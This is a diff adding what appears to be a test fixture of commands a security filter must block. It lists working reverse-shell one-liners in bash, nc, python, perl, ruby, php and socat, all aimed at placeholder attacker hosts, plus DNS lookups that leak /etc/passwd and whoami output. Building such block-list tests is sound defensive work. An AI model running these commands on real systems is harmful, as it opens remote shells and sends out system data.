@@ -1,0 +1,15 @@
+# Reverse shell and RCE patterns (must ALL be blocked)
+nc -e /bin/sh attacker.com 4444
+nc -e /bin/bash 10.0.0.1 1337
+nc -c /bin/sh example.com 8080
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+bash -i >& /dev/udp/10.0.0.1/4444 0>&1
+python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+python -c "import os; os.system('nc -e /bin/sh 10.0.0.1 4444')"
+python -c "import pty; pty.spawn('/bin/sh')"
+perl -e "use Socket;$i='10.0.0.1';$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));exec('/bin/sh -i');"
+ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+nslookup $(cat /etc/passwd).attacker.com
+dig $(whoami).attacker.com
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
